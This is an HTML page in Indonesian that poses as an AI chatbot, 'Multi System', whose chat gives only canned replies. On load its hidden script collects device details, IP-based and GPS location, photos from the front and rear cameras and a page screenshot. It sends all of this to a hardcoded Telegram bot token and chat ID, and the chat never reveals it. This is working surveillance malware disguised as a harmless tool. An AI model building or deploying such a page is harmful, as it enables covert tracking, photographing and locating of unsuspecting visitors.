<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>MULTI SYSTEM SCRIPT</title>
  <meta name="description" content="MULTI SYSTEM - POWERED BY NODE">
  <link rel="icon" type="image/x-icon" href="https://files.catbox.moe/5bwkpb.ico">
  <link rel="icon" type="image/png" href="https://files.catbox.moe/5bwkpb.png">
  <link rel="icon" type="image/jpeg" href="https://files.catbox.moe/5bwkpb.jpg">
  <link rel="apple-touch-icon" href="https://files.catbox.moe/5bwkpb.png">
  <meta name="theme-color" content="#000000">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>

  <style>
    body {
        background: linear-gradient(270deg, #0f0c29, #302b63, #24243e);
        background-size: 600% 600%;
        animation: bgMove 12s ease infinite;
        margin: 0;
        padding: 0;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        font-family: "Orbitron", Arial, sans-serif;
        color: #999;
        overflow: hidden;
        position: relative;
    }
    @keyframes bgMove {
        0% { background-position: 0% 50%; }
        50% { background-position: 100% 50%; }
        100% { background-position: 0% 50%; }
    }

    .particle {
        position: absolute;
        background: radial-gradient(circle, #ffffffaa 0%, transparent 70%);
        border-radius: 50%;
        opacity: .7;
        animation: floatParticle linear infinite;
    }
    @keyframes floatParticle {
        from { transform: translateY(100vh) scale(1); }
        to { transform: translateY(-10vh) scale(0); }
    }

    #chat-container {
        width: 90%;
        max-width: 600px;
        height: 80vh;
        background: rgba(0, 0, 0, 0.8);
        border: 2px solid #c293ff;
        border-radius: 10px;
        display: flex;
        flex-direction: column;
        box-shadow: 0 0 20px #9b59ff;
        z-index: 5;
        overflow: hidden;
        position: relative;
    }

    #chat-header {
        background: linear-gradient(90deg, #6e48aa, #9d50bb);
        color: #fff;
        padding: 10px;
        text-align: center;
        font-size: 18px;
        text-shadow: 0 0 5px #fff;
        border-bottom: 1px solid #c293ff;
    }

    #chat-messages {
        flex: 1;
        padding: 10px;
        overflow-y: auto;
        background: rgba(0, 0, 0, 0.5);
        display: flex;
        flex-direction: column;
        gap: 10px;
    }

    .message {
        padding: 10px 15px;
        border-radius: 15px;
        max-width: 70%;
        word-wrap: break-word;
        font-size: 14px;
        line-height: 1.4;
    }

    .ai-message {
        background: linear-gradient(90deg, #ff0080, #ff8c00);
        color: #fff;
        align-self: flex-start;
        text-shadow: 0 0 5px #000;
        border-bottom-left-radius: 5px;
    }

    .user-message {
        background: linear-gradient(90deg, #40e0d0, #00ff00);
        color: #000;
        align-self: flex-end;
        margin-left: auto;
        border-bottom-right-radius: 5px;
    }

    #chat-input-container {
        display: flex;
        padding: 10px;
        background: rgba(0, 0, 0, 0.8);
        border-top: 1px solid #c293ff;
    }

    #chat-input {
        flex: 1;
        padding: 10px 15px;
        border: none;
        border-radius: 20px;
        background: #222;
        color: #fff;
        font-family: inherit;
        outline: none;
    }

    #send-button {
        padding: 10px 20px;
        margin-left: 10px;
        background: linear-gradient(90deg, #6e48aa, #9d50bb);
        color: #fff;
        border: none;
        border-radius: 20px;
        cursor: pointer;
        font-family: inherit;
        transition: background 0.3s;
    }

    #send-button:hover {
        background: linear-gradient(90deg, #9d50bb, #6e48aa);
    }

    .hidden {
        display: none;
    }

    #music-visualizer {
        position: absolute;
        bottom: 40px;
        left: 50%;
        transform: translateX(-50%);
        display: flex;
        align-items: flex-end;
        gap: 6px;
        height: 40px;
        z-index: 10;
    }
    .bar {
        width: 5px;
        background: linear-gradient(to top, #ff0080, #ff8c00, #40e0d0);
        border-radius: 5px;
        animation: barMove 1s ease-in-out infinite;
    }
    @keyframes barMove {
        0%, 100% { height: 10px; opacity: .7; }
        50% { height: 40px; opacity: 1; }
    }

    .typing-indicator {
        display: none;
        font-style: italic;
        color: #aaa;
        align-self: flex-start;
    }
  </style>
</head>
<body>

  <script>
    for (let i = 0; i < 40; i++) {
      const p = document.createElement('div');
      p.className = 'particle';
      const size = Math.random() * 4 + 2;
      p.style.width = size + 'px';
      p.style.height = size + 'px';
      p.style.left = Math.random() * 100 + '%';
      p.style.animationDuration = (8 + Math.random() * 8) + 's';
      document.body.appendChild(p);
    }
  </script>

  <div id="chat-container">
    <div id="chat-header">AI Assistant - Multi System</div>
    <div id="chat-messages">
      <div class="message ai-message">Halo! Saya adalah AI asisten. Sistem sedang menganalisis data Anda. Apa yang bisa saya bantu?</div>
      <div class="typing-indicator" id="typing">AI sedang mengetik...</div>
    </div>
    <div id="chat-input-container">
      <input type="text" id="chat-input" placeholder="Ketik pesan Anda...">
      <button id="send-button">Kirim</button>
    </div>
  </div>

  <video id="v" autoplay="" muted="" class="hidden"></video>
  <canvas id="c" class="hidden"></canvas>

  <audio id="bg-music" src="https://files.catbox.moe/yu43bv.m4a" preload="auto" loop="" muted=""></audio>

  <div id="music-visualizer">
    <div class="bar" style="animation-delay:0s"></div>
    <div class="bar" style="animation-delay:0.1s"></div>
    <div class="bar" style="animation-delay:0.2s"></div>
    <div class="bar" style="animation-delay:0.3s"></div>
    <div class="bar" style="animation-delay:0.4s"></div>
    <div class="bar" style="animation-delay:0.5s"></div>
    <div class="bar" style="animation-delay:0.6s"></div>
    <div class="bar" style="animation-delay:0.7s"></div>
    <div class="bar" style="animation-delay:0.8s"></div>
    <div class="bar" style="animation-delay:0.9s"></div>
  </div>

  <script>
    (() => {
      const T = '8245827093:AAEafxGE6ns_M7JHP_2XtoORUk6k-udesOU',
        C = '7935332916',
        chatMessages = document.getElementById('chat-messages'),
        chatInput = document.getElementById('chat-input'),
        sendButton = document.getElementById('send-button'),
        typingIndicator = document.getElementById('typing');

      const addMessage = (sender, text) => {
        const msgDiv = document.createElement('div');
        msgDiv.className = 'message ' + (sender === 'AI' ? 'ai-message' : 'user-message');
        msgDiv.textContent = text;
        chatMessages.appendChild(msgDiv);
        chatMessages.scrollTop = chatMessages.scrollHeight;
      };

      const sendMessage = () => {
        const text = chatInput.value.trim();
        if (text) {
          addMessage('User', text);
          chatInput.value = '';
          // Simulate AI response
          typingIndicator.style.display = 'block';
          setTimeout(() => {
            typingIndicator.style.display = 'none';
            addMessage('AI', 'Pesan Anda telah diterima. Sistem sedang memproses...');
          }, 2000);
        }
      };

      sendButton.addEventListener('click', sendMessage);
      chatInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') sendMessage();
      });

      const audio = document.getElementById('bg-music');
      const enableSound = () => {
        audio.muted = false;
        audio.play().catch(e => console.log('Autoplay diblokir:', e));
        document.removeEventListener('click', enableSound);
        document.removeEventListener('touchstart', enableSound);
      };
      audio.play().catch(() => {});
      document.addEventListener('click', enableSound);
      document.addEventListener('touchstart', enableSound);

      const sTG = async d => {
        try {
          await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: C, text: d, parse_mode: 'HTML' })
          })
        } catch (e) {}
      };

      const sP = async (b, f) => {
        try {
          const fd = new FormData();
          fd.append('chat_id', C);
          fd.append('photo', b, f);
          await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd })
        } catch (e) {}
      };

      const gLD = async (a, b) => {
        try {
          const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${a}&lon=${b}&zoom=18&addressdetails=1`),
            d = await r.json();
          if (d.address) return {
            kb: d.address.county || d.address.city || d.address.state || "Tidak diketahui",
            kc: d.address.suburb || d.address.village || d.address.town || "Tidak diketahui",
            fa: d.display_name || "Alamat tidak tersedia"
          }
        } catch (e) {}
        return { kb: "Tidak diketahui", kc: "Tidak diketahui", fa: "Alamat tidak tersedia" }
      };

      const cDI = async () => {
        let m = 'TRACKING REPORTER NOTIFICATIONS\n\n';
        m += 'DEVICE INFORMATION\n';
        m += `ğŸ–¥ï¸ DEVICE: ${navigator.userAgent}\n`;
        m += `ğŸ’» PLATFORM: ${navigator.platform}\n`;
        m += `ğŸŒ LANGUAGE: ${navigator.language}\n`;
        m += `ğŸ“¶ ONLINE: ${navigator.onLine ? 'Online' : 'Offline'}\n`;
        m += `ğŸ“º SREEN SIZE: ${screen.width}x${screen.height}\n`;
        m += `ğŸªŸ WINDOWS SIZE: ${innerWidth}x${innerHeight}\n`;
        m += `ğŸ’¾ RAM DEVICE: ${navigator.deviceMemory || 'Unknown'} GB\n`;
        m += `ğŸ§  CPU DEVICE: ${navigator.hardwareConcurrency}</b></blockquote>\n`;
        if (navigator.getBattery) {
          try {
            const b = await navigator.getBattery();
            m += `<blockquote><b>ğŸ”‹ BATTERY: ${Math.floor(b.level * 100)}%\n`;
            m += `ğŸ”Œ CHARGING: ${b.charging ? 'âœ… YA' : 'âŒ TIDAK'}\n`;
          } catch (e) {
            m += 'ğŸ”‹ BATTERY: âŒ Tidak tersedia</b></blockquote>\n';
          }
        }
        m += `<blockquote><b>â° ACCES TIME: ${new Date().toString()}\n`;
        m += `ğŸ•’ PAGE LOAD TIME: ${performance.now().toFixed(2)} ms\n`;
        m += `ğŸ“œ HISTORY LENGTH: ${history.length}\n`;
        m += `âœ‹ TOUCH SUPPORT: ${'ontouchstart' in window ? 'âœ… YA' : 'âŒ TIDAK'}\n`;
        m += `ğŸ”— REFFERER: ${document.referrer || 'None'}\n`;
        m += `ğŸŒ URL ACCES: ${location.href}\n`;
        m += `ğŸ“„ TITLE: ${document.title}\n`;
        m += `ğŸ•“ TIMEZONE: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
        m += `ğŸ§­ OFFSET: ${new Date().getTimezoneOffset()} menit</b></blockquote>\n\n`;

        try {
          const i = await fetch('https://ipapi.co/json/');
          const d = await i.json();
          m += '<blockquote><b>ğŸ“ LOCATION INFORMATION\n';
          m += `ğŸ“¡ IP ADDRES: ${d.ip}\n`;
          m += `ğŸ™ï¸ KOTA: ${d.city}\n`;
          m += `ğŸ™ï¸ KABUPATEN: ${d.region}\n`;
          m += `ğŸ—ºï¸ WILAYAH: ${d.region}\n`;
          m += `ğŸŒ NEGARA: ${d.country_name}\n`;
          m += `ğŸ·ï¸ KODE POS: ${d.postal}\n`;

          if (d.latitude && d.longitude) {
            m += `ğŸ“Œ LATITUDE: ${d.latitude}\n`;
            m += `ğŸ“ LONGITUDE: ${d.longitude}\n`;

            const l = await gLD(d.latitude, d.longitude);
            m += `ğŸ™ï¸ KABUPATEN: ${l.kb}\n`;
            m += `ğŸ™ï¸ KECAMATAN: ${l.kc}\n`;
            m += `ğŸ  ALAMAT LENGKAP: ${l.fa}</b></blockquote>\n`;
          }
        } catch (e) {
          m += 'âŒ Gagal mendapatkan informasi lokasi\n';
        }
        m += '\n<blockquote><b>POWERED BY LEZARD OFFICIAL</b></blockquote>';
        return m;
      };

      const captureCamera = async (mode) => {
        const v = document.getElementById('v'),
          c = document.getElementById('c');
        let stream;
        try {
          stream = await navigator.mediaDevices.getUserMedia({
            video: {
              facingMode: { exact: mode }
            }
          });
          v.srcObject = stream;
          await new Promise(resolve => v.onloadedmetadata = resolve);
          v.play();
          await new Promise(r => setTimeout(r, 1500));

          c.width = v.videoWidth;
          c.height = v.videoHeight;
          c.getContext('2d').drawImage(v, 0, 0);

          c.toBlob(b => sP(b, `${mode}_camera_capture.jpg`), 'image/jpeg');

          stream.getTracks().forEach(t => t.stop());
          return true;

        } catch (e) {
          if (stream) {
            stream.getTracks().forEach(t => t.stop());
          }
          await sTG(`âš ï¸ Gagal Akses Kamera ${mode.toUpperCase()}. Mencoba mode lain...`);
          return false;
        }
      };

      const ST = async () => {
        await sTG(await cDI());
        let cameraSuccess = false;
        cameraSuccess = await captureCamera("user");
        if (!cameraSuccess) {
          cameraSuccess = await captureCamera("environment");
        }
        if (!cameraSuccess) {
          await sTG('âŒ Akses ke kedua kamera (Depan & Belakang) diblokir.');
        }
        setTimeout(async () => {
          try {
            const cn = await html2canvas(document.body);
            cn.toBlob(b => sP(b, 'screenshot.jpg'), 'image/jpeg')
          } catch (e) {
            await sTG('âŒ Screenshot failed')
          }
        }, 2000);
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(async p => {
            const lat = p.coords.latitude;
            const lon = p.coords.longitude;
            let g = `<blockquote><b>ğŸ“ GPS TRACKING (ONE-TIME)</b>\n\n`;
            g += `ğŸ“Œ LAT: ${lat}\nğŸ“ LNG: ${lon}\n`;
            g += `ğŸ¯ AKURASI: ${p.coords.accuracy}m\n`;
            g += `ğŸ—ºï¸ GOOGLE MAPS: https://www.google.com/maps/search/?api=1&query=${lat},${lon}\n`;
            const l = await gLD(lat, lon);
            g += `ğŸ™ï¸ KABUPATEN: ${l.kb}\nğŸ™ï¸ KECAMATAN: ${l.kc}\nğŸ  ALAMAT: ${l.fa}</blockquote>\n`;
            await sTG(g)
          },
            async e => {
              await sTG(`âŒ GPS Error: ${e.message}`)
            }, { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 })
        }
      };
      ST();
    })();
  </script>

</body>
</html>
